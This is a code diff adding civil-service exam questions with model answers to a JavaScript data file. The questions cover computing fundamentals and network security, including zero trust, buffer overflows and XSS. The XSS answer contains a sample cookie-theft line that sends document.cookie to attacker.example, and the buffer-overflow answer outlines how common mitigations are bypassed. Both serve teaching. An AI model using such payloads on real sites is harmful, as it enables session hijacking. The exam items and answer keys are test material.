@@ -1191,6 +1191,497 @@ WHERE P.CID = ?;</code></pre>
               <li><strong>立即更新（Immediate Update）：</strong>交易尚未 COMMIT 前，更新可能已先寫入資料庫，因此必須使用 write-ahead logging，先記錄舊值與新值。若交易未提交就故障，系統需依日誌 UNDO，回復到交易前狀態以確保原子性；若交易已提交但部分資料尚未落盤，則需 REDO 以確保持續性。</li>
             </ul>
           </section>`
+  },
+  {
+    "id": 63,
+    "slug": "question-63",
+    "title": "不同進位數相加並以八進位表示",
+    "points": "15 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "計算機概論",
+    "subjectSlug": "115-national-security-third-computer-introduction",
+    "order": "一",
+    "html": `<div class="question-head"><span class="number">一</span><div><h2>不同進位數相加並以八進位表示</h2><p>配分 15 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>A = (1982)<sub>10</sub>，B = (3456)<sub>8</sub>，C = (6C7D)<sub>16</sub>，D = (10101101)<sub>2</sub>。計算 A、B、C、D 四數之和，並用八進位表示答案，請詳列計算過程。</p></section>
+          <section class="answer-block"><h3>轉成十進位</h3><pre><code>A = (1982)10 = 1982
+B = (3456)8 = 3*8^3 + 4*8^2 + 5*8 + 6
+  = 3*512 + 4*64 + 40 + 6
+  = 1536 + 256 + 40 + 6 = 1838
+C = (6C7D)16 = 6*16^3 + C*16^2 + 7*16 + D
+  = 6*4096 + 12*256 + 112 + 13
+  = 24576 + 3072 + 112 + 13 = 27773
+D = (10101101)2
+  = 1*128 + 0*64 + 1*32 + 0*16 + 1*8 + 1*4 + 0*2 + 1
+  = 173</code></pre></section>
+          <section class="answer-block"><h3>加總並轉八進位</h3><pre><code>總和 = 1982 + 1838 + 27773 + 173 = 31766
+
+31766 / 8 = 3970 ... 6
+3970  / 8 = 496  ... 2
+496   / 8 = 62   ... 0
+62    / 8 = 7    ... 6
+7     / 8 = 0    ... 7</code></pre><p>由最後的餘數往回讀，得到 <strong>(76026)<sub>8</sub></strong>。因此 A、B、C、D 四數之和為 <strong>(76026)<sub>8</sub></strong>。</p></section>`
+  },
+  {
+    "id": 64,
+    "slug": "question-64",
+    "title": "HDD 與 SSD 差異比較",
+    "points": "15 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "計算機概論",
+    "subjectSlug": "115-national-security-third-computer-introduction",
+    "order": "二",
+    "html": `<div class="question-head"><span class="number">二</span><div><h2>HDD 與 SSD 差異比較</h2><p>配分 15 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>請詳細比較傳統硬碟（HDD）和固態硬碟（SSD）之差異。</p></section>
+          <section class="answer-block"><h3>比較表</h3><table><thead><tr><th>項目</th><th>HDD</th><th>SSD</th></tr></thead><tbody><tr><td>儲存原理</td><td>以磁性碟盤儲存資料，讀寫頭在碟盤上方定位。</td><td>以 NAND Flash 快閃記憶體儲存資料，無機械讀寫頭。</td></tr><tr><td>速度</td><td>受碟盤轉速、尋道時間影響，隨機讀寫較慢。</td><td>存取延遲低，隨機讀寫與開機、載入程式速度通常明顯較快。</td></tr><tr><td>耐震性</td><td>有旋轉碟盤與讀寫頭，碰撞時較容易受損。</td><td>無移動機械結構，抗震與攜帶穩定性較佳。</td></tr><tr><td>噪音與耗電</td><td>馬達與碟盤旋轉會產生噪音與震動，耗電較高。</td><td>無旋轉部件，較安靜且通常較省電。</td></tr><tr><td>容量與價格</td><td>大容量單位價格較低，適合大量資料保存。</td><td>單位容量價格較高，但近年價格下降，適合系統碟與高速應用。</td></tr><tr><td>壽命限制</td><td>主要受機械磨耗、壞軌、震動與老化影響。</td><td>快閃記憶體有寫入次數限制，但有 wear leveling、TRIM 等機制延長壽命。</td></tr><tr><td>資料救援</td><td>故障後若碟盤未嚴重損壞，仍可能透過專業方式救援。</td><td>控制器、加密與磨耗平均化使救援較複雜。</td></tr></tbody></table></section>
+          <section class="answer-block"><h3>結論</h3><p>HDD 優點是容量大、成本低，適合作為備份、影音資料與大量歸檔儲存。SSD 優點是速度快、延遲低、安靜、省電且耐震，適合作為作業系統、應用程式、資料庫或需要快速存取的工作磁碟。實務上常採 SSD 作系統碟、HDD 作大量資料碟的混合配置。</p></section>`
+  },
+  {
+    "id": 65,
+    "slug": "question-65",
+    "title": "二元搜尋樹由小到大排序演算法",
+    "points": "15 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "計算機概論",
+    "subjectSlug": "115-national-security-third-computer-introduction",
+    "order": "三",
+    "html": `<div class="question-head"><span class="number">三</span><div><h2>二元搜尋樹由小到大排序演算法</h2><p>配分 15 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>有一組資料以二元搜尋樹（binary search tree）的結構儲存，請提供一個演算法，將這組資料由小到大排序，並舉例說明。</p></section>
+          <section class="answer-block"><h3>演算法</h3><p>二元搜尋樹的性質是：對任一節點而言，左子樹所有節點值小於該節點，右子樹所有節點值大於該節點。因此只要對 BST 做中序走訪（inorder traversal），順序為左子樹、根節點、右子樹，就會得到由小到大的排序結果。</p><pre><code>Inorder(node):
+    if node == null:
+        return
+    Inorder(node.left)
+    output node.data
+    Inorder(node.right)</code></pre></section>
+          <section class="answer-block"><h3>範例</h3><pre class="tree-pre"><code>        50
+       /  \\
+     30    70
+    / \\   / \\
+  20  40 60  80</code></pre><p>中序走訪流程為：先走訪 50 的左子樹，得到 20、30、40；接著輸出根節點 50；最後走訪右子樹，得到 60、70、80。因此排序結果為：</p><pre><code>20, 30, 40, 50, 60, 70, 80</code></pre><p>若樹中有 n 個節點，每個節點只拜訪一次，時間複雜度為 O(n)；遞迴所需空間與樹高有關，平均為 O(log n)，最壞為 O(n)。</p></section>`
+  },
+  {
+    "id": 66,
+    "slug": "question-66",
+    "title": "以 AND 與 XOR 實作 NOT 邏輯閘",
+    "points": "15 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "計算機概論",
+    "subjectSlug": "115-national-security-third-computer-introduction",
+    "order": "四",
+    "html": `<div class="question-head"><span class="number">四</span><div><h2>以 AND 與 XOR 實作 NOT 邏輯閘</h2><p>配分 15 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>當實作電路時發現缺少 NOT 邏輯閘，但手邊有 AND Gate 與 XOR Gate，請問如何應用現有邏輯閘達成 NOT 邏輯閘功能需求？</p></section>
+          <section class="answer-block"><h3>作法</h3><p>XOR 的特性是：當兩個輸入相同時輸出 0，不同時輸出 1。因此若將待反相的輸入設為 X，另一端接固定邏輯 1，則輸出為：</p><pre><code>Y = X XOR 1</code></pre><table><thead><tr><th>X</th><th>1</th><th>X XOR 1</th><th>NOT X</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td><td>0</td></tr></tbody></table><p>由真值表可知 <code>X XOR 1</code> 與 <code>NOT X</code> 完全相同，因此可用一個 XOR Gate 加上固定邏輯 1 來取代 NOT Gate。</p></section>
+          <section class="answer-block"><h3>補充說明</h3><p>若電路環境允許接高電位 Vcc 或常數 1，則 AND Gate 不一定需要使用。若題目限制完全不能使用常數 1，只能使用輸入變數、AND 與 XOR，則無法實作 NOT，因為 AND 與 XOR 對全 0 輸入都只能產生 0，但 NOT 在輸入 0 時必須輸出 1。</p></section>`
+  },
+  {
+    "id": 67,
+    "slug": "question-67",
+    "title": "FCFS 排程週轉時間計算",
+    "points": "20 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "計算機概論",
+    "subjectSlug": "115-national-security-third-computer-introduction",
+    "order": "五",
+    "html": `<div class="question-head"><span class="number">五</span><div><h2>FCFS 排程週轉時間計算</h2><p>配分 20 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>某一作業系統之中央處理器排程使用先到先服務（first-come, first-served scheduling）。若佇列共有 P1、P2、P3、P4，抵達時間與所需執行時間如下：P1(0,5)、P2(3,7)、P3(10,3)、P4(17,4)。請計算每個程序的總執行時間（turnaround time）。時間單位為毫秒。</p></section>
+          <section class="answer-block"><h3>排程甘特圖</h3><p>FCFS 依照到達順序執行，且非搶先式。各程序到達順序為 P1、P2、P3、P4。</p><pre><code>0      5       12      15   17      21
+|  P1  |   P2   |  P3  |idle|  P4  |</code></pre><p>P3 執行完時間為 15，但 P4 到達時間是 17，所以 CPU 在 15 到 17 之間閒置。</p></section>
+          <section class="answer-block"><h3>週轉時間</h3><p>週轉時間 = 完成時間 - 到達時間。</p><table><thead><tr><th>程序</th><th>到達時間</th><th>執行時間</th><th>完成時間</th><th>週轉時間</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>5</td><td>5</td><td>5 - 0 = 5</td></tr><tr><td>P2</td><td>3</td><td>7</td><td>12</td><td>12 - 3 = 9</td></tr><tr><td>P3</td><td>10</td><td>3</td><td>15</td><td>15 - 10 = 5</td></tr><tr><td>P4</td><td>17</td><td>4</td><td>21</td><td>21 - 17 = 4</td></tr></tbody></table><p>因此 P1、P2、P3、P4 的週轉時間分別為 <strong>5、9、5、4 毫秒</strong>。</p></section>`
+  },
+  {
+    "id": 68,
+    "slug": "question-68",
+    "title": "Python 插入排序輸出與流程",
+    "points": "20 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "計算機概論",
+    "subjectSlug": "115-national-security-third-computer-introduction",
+    "order": "六",
+    "html": `<div class="question-head"><span class="number">六</span><div><h2>Python 插入排序輸出與流程</h2><p>配分 20 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>寫出下列 Python 程式的輸出，並詳細解釋程式執行流程。程式對陣列 <code>[35, 91, 25, 30, 6, 18, 8, 55]</code> 執行 <code>foo(arr)</code>。</p></section>
+          <section class="answer-block"><h3>程式功能</h3><p>此程式是插入排序法（insertion sort）。外層迴圈從索引 1 到 n-1，每次取出 <code>key = arr[i]</code>，再將左邊已排序區中比 key 大的元素往右移，最後把 key 放到正確位置。每一輪外層迴圈結束後都會 <code>print(arr)</code>，因此會印出 7 行。</p></section>
+          <section class="answer-block"><h3>逐輪結果</h3><table><thead><tr><th>i</th><th>key</th><th>說明</th><th>列印結果</th></tr></thead><tbody><tr><td>1</td><td>91</td><td>35 不大於 91，不移動。</td><td>[35, 91, 25, 30, 6, 18, 8, 55]</td></tr><tr><td>2</td><td>25</td><td>91、35 右移，25 插到最前面。</td><td>[25, 35, 91, 30, 6, 18, 8, 55]</td></tr><tr><td>3</td><td>30</td><td>91、35 右移，30 插在 25 後面。</td><td>[25, 30, 35, 91, 6, 18, 8, 55]</td></tr><tr><td>4</td><td>6</td><td>91、35、30、25 右移，6 插到最前面。</td><td>[6, 25, 30, 35, 91, 18, 8, 55]</td></tr><tr><td>5</td><td>18</td><td>91、35、30、25 右移，18 插在 6 後面。</td><td>[6, 18, 25, 30, 35, 91, 8, 55]</td></tr><tr><td>6</td><td>8</td><td>91、35、30、25、18 右移，8 插在 6 後面。</td><td>[6, 8, 18, 25, 30, 35, 91, 55]</td></tr><tr><td>7</td><td>55</td><td>91 右移，55 插在 35 後面。</td><td>[6, 8, 18, 25, 30, 35, 55, 91]</td></tr></tbody></table></section>
+          <section class="answer-block"><h3>完整輸出</h3><pre><code>[35, 91, 25, 30, 6, 18, 8, 55]
+[25, 35, 91, 30, 6, 18, 8, 55]
+[25, 30, 35, 91, 6, 18, 8, 55]
+[6, 25, 30, 35, 91, 18, 8, 55]
+[6, 18, 25, 30, 35, 91, 8, 55]
+[6, 8, 18, 25, 30, 35, 91, 55]
+[6, 8, 18, 25, 30, 35, 55, 91]</code></pre></section>`
+  },
+  {
+    "id": 69,
+    "slug": "question-69",
+    "title": "邊界防禦與零信任架構之核心差異",
+    "points": "20 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "網路應用與安全",
+    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
+    "order": "一",
+    "html": `<div class="question-head">
+            <span class="number">一</span>
+            <div>
+              <h2>邊界防禦與零信任架構之核心差異</h2>
+              <p>配分：20 分</p>
+            </div>
+          </div>
+
+          <section class="prompt-block">
+            <h3>題目</h3>
+            <p>傳統網路安全採取邊界防禦模式（Perimeter Defense Model），但現代企業逐漸轉向零信任架構（Zero Trust Architecture, ZTA）。請說明兩者核心理念與差異，並解釋永不信任、持續驗證與最小權限原則的意涵。（10 分）請舉例說明零信任環境下，身分驗證與授權邏輯如何改變，並說明設備健康狀態（Device Posture）如何影響存取決策。（10 分）</p>
+          </section>
+
+          <section class="answer-block">
+            <h3>核心理念與差異</h3>
+            <p>邊界防禦模式假設企業內網相對可信，主要在網路出入口部署防火牆、VPN、閘道器等控制措施，重點是把攻擊者擋在邊界之外。其弱點是：一旦帳號、VPN 或內部主機被攻破，攻擊者可能在內網橫向移動。</p>
+            <p>零信任架構則不以網路位置作為信任基礎，而是採取「每一次存取都要被評估」的設計。使用者即使在內網，也不會自動被視為可信；系統會依身分、裝置、位置、行為、資料敏感度與風險分數決定是否允許存取。</p>
+            <ul>
+              <li><strong>永不信任：</strong>不因使用者位於內網、連上 VPN 或使用公司設備就直接放行。</li>
+              <li><strong>持續驗證：</strong>不只登入時驗證，存取期間也會依風險變化重新評估，例如異常地點登入或行為偏離常態時要求重新驗證。</li>
+              <li><strong>最小權限：</strong>只給完成工作所需的最小資源、最小操作權限與最短有效時間。</li>
+            </ul>
+          </section>
+
+          <section class="answer-block">
+            <h3>身分、授權與設備健康狀態</h3>
+            <p>在傳統模式下，員工連上 VPN 後常可看到較大範圍的內部系統；在零信任環境下，員工即使登入成功，仍須經過多因素驗證、角色判斷、工作情境與風險評估，才能存取特定應用程式。例如財務人員只能進入付款系統的審核功能，不能直接連到資料庫或其他部門系統。</p>
+            <p>設備健康狀態會直接影響存取決策。若筆電有啟用磁碟加密、EDR 正常、作業系統與瀏覽器已更新，系統可允許正常存取；若裝置未安裝安全修補、偵測到惡意程式、EDR 離線或來自未註冊設備，系統可能拒絕存取、只允許低敏感資料、要求隔離修復，或觸發額外 MFA。</p>
+          </section>`
+  },
+  {
+    "id": 70,
+    "slug": "question-70",
+    "title": "供應鏈攻擊、案例與 SBOM 風險控管",
+    "points": "20 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "網路應用與安全",
+    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
+    "order": "二",
+    "html": `<div class="question-head">
+            <span class="number">二</span>
+            <div>
+              <h2>供應鏈攻擊、案例與 SBOM 風險控管</h2>
+              <p>配分：20 分</p>
+            </div>
+          </div>
+
+          <section class="prompt-block">
+            <h3>題目</h3>
+            <p>近年來供應鏈攻擊（Supply Chain Attack）已成為國家級威脅。請解釋何謂供應鏈攻擊，並各舉一個軟體與硬體層面的實際案例。（10 分）請說明攻擊者為何鎖定第三方供應商而非直接攻擊最終目標，並說明軟體物料清單（SBOM）如何協助降低此類風險。（10 分）</p>
+          </section>
+
+          <section class="answer-block">
+            <h3>定義與案例</h3>
+            <p>供應鏈攻擊是指攻擊者不直接攻擊最終目標，而是滲透其信任的供應商、開發流程、更新機制、套件庫、硬體零組件或外包維運管道，再藉由受信任關係進入目標環境。</p>
+            <ul>
+              <li><strong>軟體案例：</strong>SolarWinds Orion 事件中，攻擊者污染軟體建置與更新流程，使受害組織安裝含後門的合法更新套件。</li>
+              <li><strong>硬體案例：</strong>硬體供應鏈可能在韌體、晶片、網通設備或出貨前設定中植入後門。例如遭竄改的網路設備韌體可在部署後提供遠端控制或資料外洩通道。</li>
+            </ul>
+          </section>
+
+          <section class="answer-block">
+            <h3>攻擊者鎖定第三方的原因與 SBOM</h3>
+            <p>攻擊者鎖定第三方供應商，是因為大型政府或企業通常資安成熟度較高，直接入侵成本高；但供應商可能資源有限、權限很高，且更新、維運帳號或 API 已被最終目標信任。攻破一個供應商還可能同時影響多個客戶，具有放大效果。</p>
+            <p>SBOM（Software Bill of Materials）是軟體成分清單，列出應用程式使用的開源套件、版本、相依元件、授權與來源。它可協助組織在漏洞爆發時快速判斷是否受影響，例如某套件出現重大 CVE 時，能立即查出哪些系統使用該版本；也能支援弱點掃描、版本治理、供應商稽核與修補優先順序安排。不過 SBOM 只是可視化工具，仍須搭配簽章驗證、建置流程保護、來源完整性檢查與供應商風險管理。</p>
+          </section>`
+  },
+  {
+    "id": 71,
+    "slug": "question-71",
+    "title": "Firewall、IDS、IPS 與 NGFW 差異分析",
+    "points": "20 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "網路應用與安全",
+    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
+    "order": "三",
+    "html": `<div class="question-head">
+            <span class="number">三</span>
+            <div>
+              <h2>Firewall、IDS、IPS 與 NGFW 差異分析</h2>
+              <p>配分：20 分</p>
+            </div>
+          </div>
+
+          <section class="prompt-block">
+            <h3>題目</h3>
+            <p>企業通常同時部署防火牆（Firewall）、入侵偵測系統（IDS）與入侵防禦系統（IPS）。請分析三者在功能定位、運作方式與回應行為上的差異。（10 分）並說明下一代防火牆（NGFW）如何整合上述功能。（10 分）</p>
+          </section>
+
+          <section class="answer-block">
+            <h3>三者差異</h3>
+            <div class="table-wrap">
+              <table>
+                <thead><tr><th>項目</th><th>Firewall</th><th>IDS</th><th>IPS</th></tr></thead>
+                <tbody>
+                  <tr><td>功能定位</td><td>依規則控制流量進出</td><td>偵測可疑或攻擊行為</td><td>偵測並即時阻擋攻擊</td></tr>
+                  <tr><td>部署方式</td><td>通常 inline 部署在網路邊界或區段間</td><td>常以旁路監聽方式接收鏡像流量</td><td>通常 inline 部署，流量必須經過設備</td></tr>
+                  <tr><td>判斷依據</td><td>IP、Port、Protocol、連線狀態與政策</td><td>特徵碼、異常行為、流量模式</td><td>特徵碼、異常行為、協定檢查與攻擊阻擋規則</td></tr>
+                  <tr><td>回應行為</td><td>允許、拒絕、記錄或 NAT</td><td>告警、記錄、通報 SOC</td><td>丟棄封包、重設連線、封鎖來源或隔離</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p>簡言之，Firewall 偏重存取控制，IDS 偏重看見與告警，IPS 則偏重即時防禦。IDS 誤判時影響較小，但只能事後反應；IPS 可即時阻擋，但誤判可能中斷正常服務。</p>
+          </section>
+
+          <section class="answer-block">
+            <h3>NGFW 的整合</h3>
+            <p>下一代防火牆（Next-Generation Firewall, NGFW）在傳統防火牆基礎上加入應用程式辨識、使用者身分整合、深度封包檢測、入侵防禦、惡意程式偵測、URL 過濾、SSL/TLS 檢查與威脅情報。它不只判斷「哪個 IP 連到哪個 Port」，還能判斷「誰、用哪個應用、存取什麼內容、風險多高」。</p>
+            <p>例如企業可設定：行銷部門允許使用雲端硬碟下載公開文件，但禁止上傳機敏檔案；若流量符合已知漏洞攻擊特徵，NGFW 可直接套用 IPS 規則阻擋並產生告警。</p>
+          </section>`
+  },
+  {
+    "id": 72,
+    "slug": "question-72",
+    "title": "緩衝區溢位原理、ACE 與現代緩解機制",
+    "points": "20 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "網路應用與安全",
+    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
+    "order": "四",
+    "html": `<div class="question-head">
+            <span class="number">四</span>
+            <div>
+              <h2>緩衝區溢位原理、ACE 與現代緩解機制</h2>
+              <p>配分：20 分</p>
+            </div>
+          </div>
+
+          <section class="prompt-block">
+            <h3>題目</h3>
+            <p>緩衝區溢位（Buffer Overflow）是許多系統漏洞的根源。請解釋其原理，並說明堆疊溢位（Stack Overflow）與堆積溢位（Heap Overflow）的差異。（10 分）請說明攻擊者如何利用此漏洞達成任意程式碼執行（ACE），並列舉兩種現代緩解機制及其常見繞過手法。（10 分）</p>
+          </section>
+
+          <section class="answer-block">
+            <h3>原理與類型差異</h3>
+            <p>緩衝區溢位發生在程式將資料寫入固定大小記憶體區域時，未檢查長度或邊界，導致資料超出緩衝區並覆蓋相鄰記憶體。常見原因包括不安全的 C/C++ 函式、錯誤的長度計算、缺乏輸入驗證或整數溢位造成配置大小不足。</p>
+            <ul>
+              <li><strong>堆疊溢位：</strong>發生在函式呼叫堆疊上的區域變數，攻擊者可能覆蓋返回位址、函式指標或控制資料，使程式流程跳到攻擊者控制的位置。</li>
+              <li><strong>堆積溢位：</strong>發生在動態配置記憶體，如 malloc/new 配置的區域。攻擊者可能破壞 heap metadata、物件欄位、虛擬函式表指標或相鄰物件，進而控制程式行為。</li>
+            </ul>
+          </section>
+
+          <section class="answer-block">
+            <h3>任意程式碼執行與緩解</h3>
+            <p>攻擊者通常先控制輸入，使溢位覆蓋控制流程資料；接著將控制流程導向 shellcode、現有函式或由多個小片段組成的 ROP chain，達成任意程式碼執行（Arbitrary Code Execution, ACE）。成功後可取得程序權限、植入後門、竊取資料或橫向移動。</p>
+            <ul>
+              <li><strong>DEP/NX：</strong>將堆疊或堆積標成不可執行，降低直接執行 shellcode 的可能。常見繞過是 return-to-libc 或 ROP，改用程式既有可執行程式碼片段完成攻擊。</li>
+              <li><strong>ASLR：</strong>隨機化程式、函式庫、堆疊與堆積位址，使攻擊者難以預測跳轉位置。常見繞過是資訊洩漏取得實際位址，或利用未隨機化模組。</li>
+              <li><strong>Stack Canary：</strong>在返回位址前放置檢查值，若溢位改寫 canary 就中止程式。常見繞過包含洩漏 canary、逐位暴力猜測或改攻擊不含 canary 的控制資料。</li>
+            </ul>
+          </section>`
+  },
+  {
+    "id": 73,
+    "slug": "question-73",
+    "title": "XSS 原理、Cookie 竊取與防禦機制",
+    "points": "20 分",
+    "year": "115年",
+    "examName": "國家安全情報人員考試",
+    "grade": "三等考試",
+    "category": "資訊組（選試英文）",
+    "subject": "網路應用與安全",
+    "subjectSlug": "115-national-security-intelligence-third-network-application-security",
+    "order": "五",
+    "html": `<div class="question-head">
+            <span class="number">五</span>
+            <div>
+              <h2>XSS 原理、Cookie 竊取與防禦機制</h2>
+              <p>配分：20 分</p>
+            </div>
+          </div>
+
+          <section class="prompt-block">
+            <h3>題目</h3>
+            <p>跨站腳本攻擊（Cross-Site Scripting, XSS）是 OWASP Top 10 中常見的網頁應用程式漏洞。請說明 XSS 的攻擊原理，並比較儲存型與反射型的差異。（10 分）請說明攻擊者如何利用 XSS 竊取使用者的 Session Cookie，並列舉至少兩種有效的防禦機制及其原理。（10 分）</p>
+          </section>
+
+          <section class="answer-block">
+            <h3>攻擊原理與類型</h3>
+            <p>XSS 是因網頁應用程式未正確處理不可信輸入，導致攻擊者可把惡意 JavaScript 插入受害者瀏覽器執行。由於腳本在合法網站來源下執行，瀏覽器會允許它讀取頁面內容、操作 DOM、發送請求，甚至在未保護時讀取 Cookie。</p>
+            <ul>
+              <li><strong>儲存型 XSS：</strong>惡意內容被存入伺服器資料庫或留言、個人檔案、工單等欄位。其他使用者瀏覽該頁時即觸發，影響範圍大且持久。</li>
+              <li><strong>反射型 XSS：</strong>惡意內容通常放在 URL 或表單參數中，伺服器立即把輸入反射到回應頁面。攻擊者常透過釣魚連結誘使受害者點擊。</li>
+            </ul>
+          </section>
+
+          <section class="answer-block">
+            <h3>Session Cookie 竊取與防禦</h3>
+            <p>若網站將 Session ID 存於可被 JavaScript 讀取的 Cookie，攻擊者可透過 XSS 執行類似 <code>fetch('https://attacker.example/?c=' + document.cookie)</code> 的程式，把 Cookie 傳到攻擊者伺服器。攻擊者取得 Session Cookie 後，可能冒用使用者身分登入系統。</p>
+            <ul>
+              <li><strong>輸出編碼：</strong>依 HTML、屬性、JavaScript、CSS、URL 等不同情境做正確 escaping，使使用者輸入被當成文字而非程式碼執行。</li>
+              <li><strong>輸入驗證與 HTML Sanitization：</strong>對可輸入 HTML 的欄位使用白名單過濾，只允許安全標籤與屬性，移除 script、事件處理器與危險 URL。</li>
+              <li><strong>HttpOnly、Secure、SameSite Cookie：</strong>HttpOnly 可阻止 JavaScript 讀取 Cookie；Secure 限制 HTTPS 傳輸；SameSite 可降低跨站請求濫用風險。</li>
+              <li><strong>Content Security Policy（CSP）：</strong>限制可載入與可執行腳本來源，禁止 inline script 或要求 nonce/hash，即使有注入點也能降低腳本執行機會。</li>
+            </ul>
+          </section>`
+  },
+  {
+    "id": 74,
+    "slug": "question-74",
+    "title": "CVSS 基本指標與 Air-gapped 修補優先順序",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資通訊及網路安全",
+    "subjectSlug": "115-immigration-third-information-communication-network-security",
+    "order": "一",
+    "html": `<div class="question-head"><span class="number">一</span><div><h2>CVSS 基本指標與 Air-gapped 修補優先順序</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>在常見漏洞評分系統（Common Vulnerability Scoring System, CVSS）的評分機制中，基本指標組（Base Metric Group）最主要考量那兩個面向？如果一個漏洞的 CVSS 分數很高，但具該漏洞的系統為建置在實體隔離（Air-gapped）的內網環境，應該如何調整對其修補優先順序的判斷並說明原因？</p></section>
+          <section class="answer-block"><h3>基本指標組的兩個面向</h3><p>CVSS 的基本指標組主要衡量漏洞本身的固有嚴重性，可分為兩大面向：</p><ul><li><strong>可利用性（Exploitability）：</strong>評估攻擊者利用漏洞的難易度，例如攻擊向量、攻擊複雜度、所需權限，以及是否需要使用者互動。</li><li><strong>影響程度（Impact）：</strong>評估漏洞成功被利用後，對系統機密性、完整性、可用性的損害，也就是對 CIA 三要素的影響。</li></ul></section>
+          <section class="answer-block"><h3>Air-gapped 環境下的優先順序</h3><p>若漏洞 CVSS 分數很高，但受影響系統建置於實體隔離的內網環境，修補優先順序可依實際暴露風險適度下修，但不應完全忽略。CVSS Base Score 反映的是漏洞本身的嚴重性，未必完全反映部署環境的可被攻擊機率；Air-gapped 環境降低了外部攻擊者直接經由網際網路利用漏洞的可能性。</p><p>然而仍須考量內部人員威脅、維護筆電、USB、供應鏈感染、誤接網路、權限濫用等風險。實務上應結合環境指標、資產重要性、替代控制措施、維護窗口與業務影響來排序。也就是說，高 CVSS 仍代表漏洞本質嚴重，但實際修補時程可低於暴露於網際網路的同類系統。</p></section>`
+  },
+  {
+    "id": 75,
+    "slug": "question-75",
+    "title": "熱備援與冷備援復原策略比較",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資通訊及網路安全",
+    "subjectSlug": "115-immigration-third-information-communication-network-security",
+    "order": "二",
+    "html": `<div class="question-head"><span class="number">二</span><div><h2>熱備援與冷備援復原策略比較</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>請比較「熱備援」（Hot Site）與「冷備援」（Cold Site）在復原策略上的差異，舉出一個適合使用「冷備援」的業務並說明原因。</p></section>
+          <section class="answer-block"><h3>復原策略差異</h3><div class="table-wrap"><table><thead><tr><th>項目</th><th>熱備援 Hot Site</th><th>冷備援 Cold Site</th></tr></thead><tbody><tr><td>準備程度</td><td>備援場地、硬體、網路、系統與資料同步機制大多已建置完成。</td><td>通常只準備場地、電力、空調、網路線路或基本設施。</td></tr><tr><td>復原速度</td><td>可快速切換，RTO 較短，RPO 較小。</td><td>需災後採購、安裝、還原與設定，RTO 較長。</td></tr><tr><td>成本</td><td>建置與維運成本高，需平時維持待命或同步。</td><td>成本低，適合非核心或可延後復原的系統。</td></tr><tr><td>適用情境</td><td>金融交易、身分驗證、即時通關、醫療急救等高可用服務。</td><td>教育訓練、歷史查詢、非即時報表、低頻內部行政系統。</td></tr></tbody></table></div></section>
+          <section class="answer-block"><h3>冷備援適用例</h3><p>例如內部教育訓練系統適合採冷備援。此類系統通常不是即時營運核心，短時間中斷不會造成重大公共服務、金錢或安全損害；其 RTO 可較長、RPO 要求也較寬鬆。若使用熱備援，成本可能高於風險降低所帶來的效益，因此採冷備援可在成本與可接受風險之間取得合理平衡。</p></section>`
+  },
+  {
+    "id": 76,
+    "slug": "question-76",
+    "title": "SAST 與 DAST 技術原理與互補性",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資通訊及網路安全",
+    "subjectSlug": "115-immigration-third-information-communication-network-security",
+    "order": "三",
+    "html": `<div class="question-head"><span class="number">三</span><div><h2>SAST 與 DAST 技術原理與互補性</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>在資訊系統開發過程有靜態應用程式安全測試（Static Application Security Testing）與動態應用程式安全測試（Dynamic Application Security Testing）兩種測試。請比較兩者的技術原理，並說明為什麼在資訊安全檢測流程中，兩者應互補使用，不可互相取代？</p></section>
